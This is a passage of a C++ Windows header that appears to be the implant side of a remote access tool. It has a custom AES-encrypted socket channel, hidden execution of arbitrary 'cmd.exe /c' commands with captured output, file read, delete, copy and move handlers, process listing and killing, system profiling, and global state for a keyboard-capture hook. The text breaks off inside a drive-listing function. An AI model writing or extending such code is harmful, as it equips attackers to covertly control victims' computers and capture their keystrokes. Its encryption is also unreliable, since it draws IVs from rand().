#pragma once

#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <bcrypt.h>
#include <gdiplus.h>
#include <iphlpapi.h>
#include <objbase.h>
#include <psapi.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <windows.h>
#include <winsock2.h>
#include <winsvc.h>
#include <ws2tcpip.h>

#include <algorithm>
#include <atomic>
#include <cstdint>
#include <map>
#include <mutex>
#include <sstream>
#include <string>
#include <thread>
#include <vector>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ole32.lib")

using namespace Gdiplus;

const int BufferSize = 65536;
const int AesKeySize = 32;
const int AesIvSize = 16;
const int ChallengeLen = 32;
const int MaxClients = 128;

std::string G_StoredHash;
std::atomic<bool> G_Running{true};
ULONG_PTR G_GdiplusToken = 0;

std::mutex G_KeylogMutex;
std::string G_KeylogData;
HHOOK G_KeylogHook = NULL;
std::atomic<bool> G_KeylogActive{false};
std::thread G_KeylogThread;

std::string BytesToHex(const std::vector<BYTE> &Data) {
  std::string Result;
  const char *HexChars = "0123456789abcdef";
  for (BYTE B : Data) {
    Result += HexChars[B >> 4];
    Result += HexChars[B & 0x0F];
  }
  return Result;
}

std::vector<BYTE> HexToBytes(const std::string &Hex) {
  std::vector<BYTE> Result;
  for (size_t i = 0; i + 1 < Hex.length(); i += 2) {
    BYTE B = (BYTE)strtol(Hex.substr(i, 2).c_str(), NULL, 16);
    Result.push_back(B);
  }
  return Result;
}

std::string WideToUtf8(const std::wstring &Wide) {
  if (Wide.empty())
    return "";
  int Len = WideCharToMultiByte(CP_UTF8, 0, Wide.c_str(), (int)Wide.size(),
                                NULL, 0, NULL, NULL);
  std::string Result(Len, 0);
  WideCharToMultiByte(CP_UTF8, 0, Wide.c_str(), (int)Wide.size(), &Result[0],
                      Len, NULL, NULL);
  return Result;
}

std::wstring Utf8ToWide(const std::string &Utf8) {
  if (Utf8.empty())
    return L"";
  int Len =
      MultiByteToWideChar(CP_UTF8, 0, Utf8.c_str(), (int)Utf8.size(), NULL, 0);
  std::wstring Result(Len, 0);
  MultiByteToWideChar(CP_UTF8, 0, Utf8.c_str(), (int)Utf8.size(), &Result[0],
                      Len);
  return Result;
}

std::vector<std::string> SplitString(const std::string &Str, char Delim) {
  std::vector<std::string> Parts;
  std::stringstream Ss(Str);
  std::string Item;
  while (std::getline(Ss, Item, Delim))
    Parts.push_back(Item);
  return Parts;
}

std::string TrimString(const std::string &Str) {
  size_t Start = Str.find_first_not_of(" \t\r\n");
  if (Start == std::string::npos)
    return "";
  size_t End = Str.find_last_not_of(" \t\r\n");
  return Str.substr(Start, End - Start + 1);
}

std::string GenerateRandomHex(int ByteCount) {
  std::vector<BYTE> Buf(ByteCount);
  for (int i = 0; i < ByteCount; i++)
    Buf[i] = (BYTE)(rand() % 256);
  return BytesToHex(Buf);
}

std::string Sha256(const std::string &Data) {
  BCRYPT_ALG_HANDLE AlgHandle = NULL;
  BCRYPT_HASH_HANDLE HashHandle = NULL;
  BYTE Hash[32] = {};
  if (BCryptOpenAlgorithmProvider(&AlgHandle, BCRYPT_SHA256_ALGORITHM, NULL,
                                  0) != 0)
    return "";
  BCryptCreateHash(AlgHandle, &HashHandle, NULL, 0, NULL, 0, 0);
  BCryptHashData(HashHandle, (PUCHAR)Data.c_str(), (ULONG)Data.size(), 0);
  BCryptFinishHash(HashHandle, Hash, 32, 0);
  BCryptDestroyHash(HashHandle);
  BCryptCloseAlgorithmProvider(AlgHandle, 0);
  return BytesToHex(std::vector<BYTE>(Hash, Hash + 32));
}

std::vector<BYTE> Sha256Raw(const std::string &Data) {
  BCRYPT_ALG_HANDLE AlgHandle = NULL;
  BCRYPT_HASH_HANDLE HashHandle = NULL;
  BYTE Hash[32] = {};
  BCryptOpenAlgorithmProvider(&AlgHandle, BCRYPT_SHA256_ALGORITHM, NULL, 0);
  BCryptCreateHash(AlgHandle, &HashHandle, NULL, 0, NULL, 0, 0);
  BCryptHashData(HashHandle, (PUCHAR)Data.c_str(), (ULONG)Data.size(), 0);
  BCryptFinishHash(HashHandle, Hash, 32, 0);
  BCryptDestroyHash(HashHandle);
  BCryptCloseAlgorithmProvider(AlgHandle, 0);
  return std::vector<BYTE>(Hash, Hash + 32);
}

static const BYTE AesSbox[256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b,
    0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0,
    0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26,
    0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2,
    0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0,
    0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed,
    0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f,
    0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5,
    0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec,
    0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14,
    0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c,
    0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d,
    0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f,
    0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e,
    0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11,
    0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f,
    0xb0, 0x54, 0xbb, 0x16};

static const BYTE AesInvSbox[256] = {
    0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e,
    0x81, 0xf3, 0xd7, 0xfb, 0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87,
    0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb, 0x54, 0x7b, 0x94, 0x32,
    0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,
    0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49,
    0x6d, 0x8b, 0xd1, 0x25, 0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16,
    0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92, 0x6c, 0x70, 0x48, 0x50,
    0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,
    0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05,
    0xb8, 0xb3, 0x45, 0x06, 0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02,
    0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b, 0x3a, 0x91, 0x11, 0x41,
    0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,
    0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8,
    0x1c, 0x75, 0xdf, 0x6e, 0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89,
    0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b, 0xfc, 0x56, 0x3e, 0x4b,
    0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,
    0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59,
    0x27, 0x80, 0xec, 0x5f, 0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d,
    0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef, 0xa0, 0xe0, 0x3b, 0x4d,
    0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
    0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63,
    0x55, 0x21, 0x0c, 0x7d};

static const BYTE Rcon[15] = {0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80,
                              0x1b, 0x36, 0x6c, 0xd8, 0xab, 0x4d, 0x9a};

void AesKeyExpansion(const std::vector<BYTE> &Key, BYTE *RoundKeys) {
  int Nk = 8, Nr = 14;
  for (int i = 0; i < 32; i++)
    RoundKeys[i] = Key[i];
  int i = 8;
  for (int Pos = 32; Pos < 240; Pos += 4, i++) {
    BYTE T[4];
    memcpy(T, RoundKeys + (Pos - 4), 4);
    if (i % Nk == 0) {
      BYTE U = T[0];
      T[0] = AesSbox[T[1]] ^ Rcon[i / Nk - 1];
      T[1] = AesSbox[T[2]];
      T[2] = AesSbox[T[3]];
      T[3] = AesSbox[U];
    } else if (Nk > 6 && i % Nk == 4) {
      T[0] = AesSbox[T[0]];
      T[1] = AesSbox[T[1]];
      T[2] = AesSbox[T[2]];
      T[3] = AesSbox[T[3]];
    }
    int Prev4 = Pos - 32;
    RoundKeys[Pos] = RoundKeys[Prev4] ^ T[0];
    RoundKeys[Pos + 1] = RoundKeys[Prev4 + 1] ^ T[1];
    RoundKeys[Pos + 2] = RoundKeys[Prev4 + 2] ^ T[2];
    RoundKeys[Pos + 3] = RoundKeys[Prev4 + 3] ^ T[3];
  }
}

void AesAddRoundKey(BYTE *State, const BYTE *RoundKey) {
  for (int i = 0; i < 16; i++)
    State[i] ^= RoundKey[i];
}

void AesSubBytes(BYTE *State) {
  for (int i = 0; i < 16; i++)
    State[i] = AesSbox[State[i]];
}

void AesInvSubBytes(BYTE *State) {
  for (int i = 0; i < 16; i++)
    State[i] = AesInvSbox[State[i]];
}

void AesShiftRows(BYTE *State) {
  BYTE T;
  T = State[1];
  State[1] = State[5];
  State[5] = State[9];
  State[9] = State[13];
  State[13] = T;
  T = State[2];
  State[2] = State[10];
  State[10] = T;
  T = State[6];
  State[6] = State[14];
  State[14] = T;
  T = State[15];
  State[15] = State[11];
  State[11] = State[7];
  State[7] = State[3];
  State[3] = T;
}

void AesInvShiftRows(BYTE *State) {
  BYTE T;
  T = State[13];
  State[13] = State[9];
  State[9] = State[5];
  State[5] = State[1];
  State[1] = T;
  T = State[2];
  State[2] = State[10];
  State[10] = T;
  T = State[6];
  State[6] = State[14];
  State[14] = T;
  T = State[3];
  State[3] = State[7];
  State[7] = State[11];
  State[11] = State[15];
  State[15] = T;
}

static BYTE GfMul(BYTE A, BYTE B) {
  BYTE R = 0;
  for (int i = 0; i < 8; i++) {
    if (B & 1)
      R ^= A;
    BYTE Hi = (BYTE)(A & 0x80);
    A <<= 1;
    if (Hi)
      A ^= 0x1b;
    B >>= 1;
  }
  return R;
}

void AesMixColumns(BYTE *State) {
  for (int C = 0; C < 4; C++) {
    int I = C * 4;
    BYTE S0 = State[I], S1 = State[I + 1], S2 = State[I + 2], S3 = State[I + 3];
    State[I] = GfMul(S0, 2) ^ GfMul(S1, 3) ^ S2 ^ S3;
    State[I + 1] = S0 ^ GfMul(S1, 2) ^ GfMul(S2, 3) ^ S3;
    State[I + 2] = S0 ^ S1 ^ GfMul(S2, 2) ^ GfMul(S3, 3);
    State[I + 3] = GfMul(S0, 3) ^ S1 ^ S2 ^ GfMul(S3, 2);
  }
}

void AesInvMixColumns(BYTE *State) {
  for (int C = 0; C < 4; C++) {
    int I = C * 4;
    BYTE S0 = State[I], S1 = State[I + 1], S2 = State[I + 2], S3 = State[I + 3];
    State[I] = GfMul(S0, 14) ^ GfMul(S1, 11) ^ GfMul(S2, 13) ^ GfMul(S3, 9);
    State[I + 1] = GfMul(S0, 9) ^ GfMul(S1, 14) ^ GfMul(S2, 11) ^ GfMul(S3, 13);
    State[I + 2] = GfMul(S0, 13) ^ GfMul(S1, 9) ^ GfMul(S2, 14) ^ GfMul(S3, 11);
    State[I + 3] = GfMul(S0, 11) ^ GfMul(S1, 13) ^ GfMul(S2, 9) ^ GfMul(S3, 14);
  }
}

void AesEncryptBlock(const BYTE *Input, BYTE *Output, const BYTE *RoundKeys) {
  BYTE State[16];
  memcpy(State, Input, 16);
  AesAddRoundKey(State, RoundKeys);
  for (int R = 1; R < 14; R++) {
    AesSubBytes(State);
    AesShiftRows(State);
    AesMixColumns(State);
    AesAddRoundKey(State, RoundKeys + R * 16);
  }
  AesSubBytes(State);
  AesShiftRows(State);
  AesAddRoundKey(State, RoundKeys + 14 * 16);
  memcpy(Output, State, 16);
}

void AesDecryptBlock(const BYTE *Input, BYTE *Output, const BYTE *RoundKeys) {
  BYTE State[16];
  memcpy(State, Input, 16);
  AesAddRoundKey(State, RoundKeys + 14 * 16);
  AesInvShiftRows(State);
  AesInvSubBytes(State);
  for (int R = 13; R > 0; R--) {
    AesAddRoundKey(State, RoundKeys + R * 16);
    AesInvMixColumns(State);
    AesInvShiftRows(State);
    AesInvSubBytes(State);
  }
  AesAddRoundKey(State, RoundKeys);
  memcpy(Output, State, 16);
}

std::vector<BYTE> AesEncryptBytes(const std::vector<BYTE> &Plaintext,
                                  const std::vector<BYTE> &Key,
                                  const std::vector<BYTE> &Iv) {
  BYTE RoundKeys[240];
  AesKeyExpansion(Key, RoundKeys);

  DWORD BlockSize = 16;
  DWORD Padding = BlockSize - ((DWORD)Plaintext.size() % BlockSize);
  if (Padding == 0)
    Padding = BlockSize;
  DWORD PaddedSize = (DWORD)Plaintext.size() + Padding;

  std::vector<BYTE> PaddedData(PaddedSize);
  if (!Plaintext.empty())
    memcpy(PaddedData.data(), Plaintext.data(), Plaintext.size());
  memset(PaddedData.data() + Plaintext.size(), (int)Padding, Padding);

  std::vector<BYTE> Ciphertext(PaddedSize);
  BYTE Chain[16];
  memcpy(Chain, Iv.data(), 16);

  for (DWORD Off = 0; Off < PaddedSize; Off += 16) {
    for (int j = 0; j < 16; j++)
      PaddedData[Off + j] ^= Chain[j];
    AesEncryptBlock(PaddedData.data() + Off, Ciphertext.data() + Off,
                    RoundKeys);
    memcpy(Chain, Ciphertext.data() + Off, 16);
  }
  return Ciphertext;
}

std::vector<BYTE> AesDecryptBytes(const std::vector<BYTE> &Ciphertext,
                                  const std::vector<BYTE> &Key,
                                  const std::vector<BYTE> &Iv) {
  BYTE RoundKeys[240];
  AesKeyExpansion(Key, RoundKeys);

  ULONG InputSize = (ULONG)Ciphertext.size();
  std::vector<BYTE> Plaintext(InputSize);
  BYTE Chain[16];
  memcpy(Chain, Iv.data(), 16);

  for (ULONG Off = 0; Off < InputSize; Off += 16) {
    BYTE Block[16];
    AesDecryptBlock(Ciphertext.data() + Off, Block, RoundKeys);
    for (int j = 0; j < 16; j++)
      Plaintext[Off + j] = Block[j] ^ Chain[j];
    memcpy(Chain, Ciphertext.data() + Off, 16);
  }

  if (InputSize > 0) {
    BYTE PadByte = Plaintext[InputSize - 1];
    if (PadByte > 0 && PadByte <= 16)
      Plaintext.resize(InputSize - PadByte);
  }
  return Plaintext;
}

std::string AesEncrypt(const std::string &Plaintext,
                       const std::vector<BYTE> &Key) {
  std::vector<BYTE> Iv(AesIvSize);
  for (int i = 0; i < AesIvSize; i++)
    Iv[i] = (BYTE)(rand() % 256);

  std::vector<BYTE> PtBytes(Plaintext.begin(), Plaintext.end());
  std::vector<BYTE> CtBytes = AesEncryptBytes(PtBytes, Key, Iv);

  std::vector<BYTE> Combined;
  Combined.insert(Combined.end(), Iv.begin(), Iv.end());
  Combined.insert(Combined.end(), CtBytes.begin(), CtBytes.end());

  return BytesToHex(Combined);
}

std::string AesDecrypt(const std::string &HexCipher,
                       const std::vector<BYTE> &Key) {
  std::vector<BYTE> Combined = HexToBytes(HexCipher);
  if (Combined.size() < AesIvSize + 16)
    return "";

  std::vector<BYTE> Iv(Combined.begin(), Combined.begin() + AesIvSize);
  std::vector<BYTE> CtBytes(Combined.begin() + AesIvSize, Combined.end());

  std::vector<BYTE> PtBytes = AesDecryptBytes(CtBytes, Key, Iv);
  return std::string(PtBytes.begin(), PtBytes.end());
}

std::string Base64Encode(const std::vector<BYTE> &Data) {
  static const char *Table =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  std::string Result;
  int Val = 0, Bits = -6;
  for (BYTE B : Data) {
    Val = (Val << 8) + B;
    Bits += 8;
    while (Bits >= 0) {
      Result += Table[(Val >> Bits) & 0x3F];
      Bits -= 6;
    }
  }
  if (Bits > -6)
    Result += Table[((Val << 8) >> (Bits + 8)) & 0x3F];
  while (Result.size() % 4)
    Result += '=';
  return Result;
}

std::vector<BYTE> Base64Decode(const std::string &Input) {
  static const int Table[256] = {
      -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
      -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
      -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63,
      52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1,
      -1, 0,  1,  2,  3,  4,  5,  6,  7,  8,  9,  10, 11, 12, 13, 14,
      15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1,
      -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
      41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1};
  std::vector<BYTE> Result;
  int Val = 0, Bits = -8;
  for (char C : Input) {
    if (C == '=')
      break;
    int Idx = Table[(unsigned char)C];
    if (Idx == -1)
      continue;
    Val = (Val << 6) + Idx;
    Bits += 6;
    if (Bits >= 0) {
      Result.push_back((BYTE)((Val >> Bits) & 0xFF));
      Bits -= 8;
    }
  }
  return Result;
}

bool SendAll(SOCKET Sock, const char *Data, int Len) {
  int Sent = 0;
  while (Sent < Len) {
    int N = send(Sock, Data + Sent, Len - Sent, 0);
    if (N <= 0)
      return false;
    Sent += N;
  }
  return true;
}

bool RecvAll(SOCKET Sock, char *Data, int Len) {
  int Got = 0;
  while (Got < Len) {
    int N = recv(Sock, Data + Got, Len - Got, 0);
    if (N <= 0)
      return false;
    Got += N;
  }
  return true;
}

bool SendEncrypted(SOCKET Sock, const std::string &Message,
                   const std::vector<BYTE> &Key) {
  std::string Encrypted = AesEncrypt(Message, Key);
  int Len = (int)Encrypted.size();
  int NetLen = htonl(Len);
  if (!SendAll(Sock, (char *)&NetLen, 4))
    return false;
  if (!SendAll(Sock, Encrypted.c_str(), Len))
    return false;
  return true;
}

std::string RecvEncrypted(SOCKET Sock, const std::vector<BYTE> &Key) {
  int NetLen = 0;
  if (!RecvAll(Sock, (char *)&NetLen, 4))
    return "";
  int Len = ntohl(NetLen);
  if (Len <= 0 || Len > 1024 * 1024 * 100)
    return "";
  std::string HexData(Len, 0);
  if (!RecvAll(Sock, &HexData[0], Len))
    return "";
  return AesDecrypt(HexData, Key);
}

std::string HexDump(const std::vector<BYTE> &Data) {
  std::string Result;
  char Buf[8];
  for (size_t i = 0; i < Data.size(); i++) {
    sprintf_s(Buf, "%02x", Data[i]);
    Result += Buf;
  }
  return Result;
}

bool RunShellCommand(const std::string &Cmd, std::string &Output) {
  HANDLE StdoutRd = NULL, StdoutWr = NULL;
  SECURITY_ATTRIBUTES Sa = {sizeof(Sa), NULL, TRUE};
  if (!CreatePipe(&StdoutRd, &StdoutWr, &Sa, 0))
    return false;
  SetHandleInformation(StdoutRd, HANDLE_FLAG_INHERIT, 0);

  PROCESS_INFORMATION Pi = {};
  STARTUPINFOW Si = {sizeof(Si)};
  Si.dwFlags = STARTF_USESTDHANDLES;
  Si.hStdOutput = StdoutWr;
  Si.hStdError = StdoutWr;
  Si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

  std::wstring WCmd = Utf8ToWide("cmd.exe /c " + Cmd);
  std::vector<WCHAR> CmdLine(WCmd.size() + 1);
  wcscpy_s(CmdLine.data(), CmdLine.size(), WCmd.c_str());

  BOOL Ok = CreateProcessW(NULL, CmdLine.data(), NULL, NULL, TRUE,
                           CREATE_NO_WINDOW, NULL, NULL, &Si, &Pi);
  CloseHandle(StdoutWr);
  if (!Ok) {
    CloseHandle(StdoutRd);
    Output = "ERR: failed to create process";
    return false;
  }

  CloseHandle(Pi.hThread);
  WaitForSingleObject(Pi.hProcess, 30000);

  char Buf[4096];
  DWORD Read = 0;
  Output.clear();
  while (ReadFile(StdoutRd, Buf, sizeof(Buf) - 1, &Read, NULL) && Read) {
    Buf[Read] = 0;
    Output += Buf;
  }
  CloseHandle(StdoutRd);
  CloseHandle(Pi.hProcess);
  return true;
}

std::string CmdHandle(SOCKET Sock, const std::vector<BYTE> &Key,
                      const std::string &Args) {
  std::string Output;
  RunShellCommand(Args, Output);
  return TrimString(Output);
}

std::string CmdLs(const std::string &Args) {
  std::string Path = Args.empty() ? ".\\*" : Args + "\\*";
  std::wstring WPath = Utf8ToWide(Path);
  WIN32_FIND_DATAW Fd;
  HANDLE HFind = FindFirstFileW(WPath.c_str(), &Fd);
  if (HFind == INVALID_HANDLE_VALUE)
    return "ERR: path not found";
  std::string Result;
  do {
    std::string Name = WideToUtf8(Fd.cFileName);
    if (Name == "." || Name == "..")
      continue;
    if (Fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
      Name = "[DIR]  " + Name;
    else {
      char SizeBuf[32];
      ULONGLONG Fs = ((ULONGLONG)Fd.nFileSizeHigh << 32) | Fd.nFileSizeLow;
      sprintf_s(SizeBuf, "%8llu", Fs);
      Name = std::string(SizeBuf) + "  " + Name;
    }
    Result += Name + "\n";
  } while (FindNextFileW(HFind, &Fd));
  FindClose(HFind);
  return Result.empty() ? "(empty)" : TrimString(Result);
}

std::string CmdCat(const std::string &Args) {
  HANDLE HFile =
      CreateFileW(Utf8ToWide(Args).c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
                  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (HFile == INVALID_HANDLE_VALUE)
    return "ERR: cannot open file";
  DWORD Fs = GetFileSize(HFile, NULL);
  if (Fs == INVALID_FILE_SIZE || Fs > 10 * 1024 * 1024) {
    CloseHandle(HFile);
    return "ERR: file too large or invalid";
  }
  std::vector<char> Buf(Fs + 1);
  DWORD Read = 0;
  ReadFile(HFile, Buf.data(), Fs, &Read, NULL);
  CloseHandle(HFile);
  Buf[Read] = 0;
  return std::string(Buf.data(), Read);
}

std::string CmdRm(const std::string &Args) {
  std::wstring WPath = Utf8ToWide(Args);
  DWORD Attr = GetFileAttributesW(WPath.c_str());
  if (Attr == INVALID_FILE_ATTRIBUTES)
    return "ERR: path not found";
  if (Attr & FILE_ATTRIBUTE_DIRECTORY)
    return RemoveDirectoryW(WPath.c_str()) ? "OK" : "ERR: remove dir failed";
  return DeleteFileW(WPath.c_str()) ? "OK" : "ERR: delete failed";
}

std::string CmdMkdir(const std::string &Args) {
  return CreateDirectoryW(Utf8ToWide(Args).c_str(), NULL)
             ? "OK"
             : "ERR: create dir failed";
}

std::string CmdCp(const std::string &Args) {
  auto Parts = SplitString(Args, ' ');
  if (Parts.size() < 2)
    return "ERR: cp <src> <dst>";
  return CopyFileW(Utf8ToWide(Parts[0]).c_str(), Utf8ToWide(Parts[1]).c_str(),
                   FALSE)
             ? "OK"
             : "ERR: copy failed";
}

std::string CmdMv(const std::string &Args) {
  auto Parts = SplitString(Args, ' ');
  if (Parts.size() < 2)
    return "ERR: mv <src> <dst>";
  return MoveFileW(Utf8ToWide(Parts[0]).c_str(), Utf8ToWide(Parts[1]).c_str())
             ? "OK"
             : "ERR: move failed";
}

std::string CmdPs() {
  std::string Result = "PID       PPID      Threads   Name\n";
  Result += "----------------------------------------\n";
  HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (Snap == INVALID_HANDLE_VALUE)
    return "ERR: snapshot failed";
  PROCESSENTRY32W Pe = {sizeof(Pe)};
  if (Process32FirstW(Snap, &Pe)) {
    do {
      char Line[200];
      std::string Name = WideToUtf8(Pe.szExeFile);
      sprintf_s(Line, "%-10u%-10u%-10u%s", Pe.th32ProcessID,
                Pe.th32ParentProcessID, Pe.cntThreads, Name.c_str());
      Result += std::string(Line) + "\n";
    } while (Process32NextW(Snap, &Pe));
  }
  CloseHandle(Snap);
  return TrimString(Result);
}

std::string CmdPwd() {
  WCHAR Path[MAX_PATH];
  GetCurrentDirectoryW(MAX_PATH, Path);
  return WideToUtf8(Path);
}

std::string CmdKill(const std::string &Args) {
  DWORD Pid = (DWORD)atoi(Args.c_str());
  if (Pid == 0) {
    std::string Name = Args;
    std::transform(Name.begin(), Name.end(), Name.begin(), ::tolower);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Snap == INVALID_HANDLE_VALUE)
      return "ERR: snapshot failed";
    PROCESSENTRY32W Pe = {sizeof(Pe)};
    bool Found = false;
    if (Process32FirstW(Snap, &Pe)) {
      do {
        std::string CurName = WideToUtf8(Pe.szExeFile);
        std::transform(CurName.begin(), CurName.end(), CurName.begin(),
                       ::tolower);
        if (CurName == Name || (CurName + ".exe") == Name) {
          Pid = Pe.th32ProcessID;
          Found = true;
          break;
        }
      } while (Process32NextW(Snap, &Pe));
    }
    CloseHandle(Snap);
    if (!Found)
      return "ERR: process not found";
  }
  HANDLE HProc = OpenProcess(PROCESS_TERMINATE, FALSE, Pid);
  if (!HProc)
    return "ERR: cannot open process";
  BOOL Ok = TerminateProcess(HProc, 0);
  CloseHandle(HProc);
  return Ok ? "OK" : "ERR: terminate failed";
}

std::string CmdSysinfo() {
  std::string Result;
  char Buf[256];

  OSVERSIONINFOW Oi = {sizeof(Oi)};
  HMODULE HMod = GetModuleHandleW(L"ntdll.dll");
  if (HMod) {
    typedef NTSTATUS(WINAPI * RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    RtlGetVersionPtr RtlGetVersion =
        (RtlGetVersionPtr)GetProcAddress(HMod, "RtlGetVersion");
    if (RtlGetVersion)
      RtlGetVersion((PRTL_OSVERSIONINFOW)&Oi);
  }
  sprintf_s(Buf, "OS Version:  Windows %lu.%lu Build %lu\n", Oi.dwMajorVersion,
            Oi.dwMinorVersion, Oi.dwBuildNumber);
  Result += Buf;

  SYSTEM_INFO Si;
  GetSystemInfo(&Si);
  sprintf_s(Buf, "CPU Cores:   %u\n", Si.dwNumberOfProcessors);
  Result += Buf;

  MEMORYSTATUSEX Ms = {sizeof(Ms)};
  GlobalMemoryStatusEx(&Ms);
  sprintf_s(Buf, "Total RAM:   %.2f GB\n",
            Ms.ullTotalPhys / (1024.0 * 1024.0 * 1024.0));
  Result += Buf;
  sprintf_s(Buf, "Avail RAM:   %.2f GB\n",
            Ms.ullAvailPhys / (1024.0 * 1024.0 * 1024.0));
  Result += Buf;

  sprintf_s(Buf, "Uptime:      %llu seconds\n", GetTickCount64() / 1000);
  Result += Buf;

  int W = GetSystemMetrics(SM_CXSCREEN);
  int H = GetSystemMetrics(SM_CYSCREEN);
  sprintf_s(Buf, "Resolution:  %d x %d\n", W, H);
  Result += Buf;

  return TrimString(Result);
}

std::string CmdDrives() {
  std::string Result;
  char Buf[256];
  DWORD Drives = GetLogicalDrives();
  for (int i = 0; i < 26; i++) {
    if (!(Drives & (1 << i)))
      continue;
    WCHAR Root[4] = {(WCHAR)(L'A' + i), L':', L'\\', 0};
    UINT Dt = GetDriveTypeW(Root);
    const char *TypeStr = "Unknown";
    switch (Dt) {
